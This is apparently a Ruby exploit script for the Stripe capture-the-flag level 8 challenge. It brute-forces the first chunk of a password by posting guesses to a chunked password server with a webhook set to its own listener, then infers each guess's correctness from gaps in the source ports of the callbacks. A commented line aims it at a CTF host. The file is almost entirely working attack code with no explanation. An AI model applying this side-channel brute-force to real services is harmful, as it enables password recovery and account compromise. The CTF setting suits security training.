require 'socket'
#require 'net/http'
#require 'net/https'
require 'rubygems'
require 'rest_client'

class ClientQuitError < RuntimeError; end

req_count = 3
STDOUT.sync = true
server = TCPServer.open(17010)
results = File.new("results.csv", 'w')

for i in 000..999 do
  num = "%03d" % i
  ports = Array.new(req_count, false)

  print "#{num}: "
  for x in 0..(req_count - 1) do
    Thread.new(x) do |a|
      begin
        RestClient.post "http://localhost:3000", '{"password": "' + num + '000000000", "webhooks": ["localhost:17010"]}'
        #RestClient.post "https://level08-2.stripe-ctf.com/user-fhjkikbisq/", '{"password": "' + num + '000000000", "webhooks": ["level02-2.stripe-ctf.com:17010"]}'
      rescue Exception => e
        puts e.backtrace
      end
      loop do
        s = server.accept
        port = s.peeraddr[1]
        s.puts "HTTP/1.1 200 OK"
        ports[a] = port
        s.close
        break
      end
    end
    sleep(1.0/20.0)
  end

  port_avg = []

  loop do
    if(!ports.include?(false))
      ports.sort!
      for y in 1..(req_count - 1) do
        avg = ports[y] - ports[y - 1]
        port_avg.push(avg)
        print "#{avg} "
      end
      print " avg: #{port_avg.inject(:+).to_f / port_avg.size}\n"
      break
    end
  end
  #puts ports.inspect
  #sleep(1.0)
end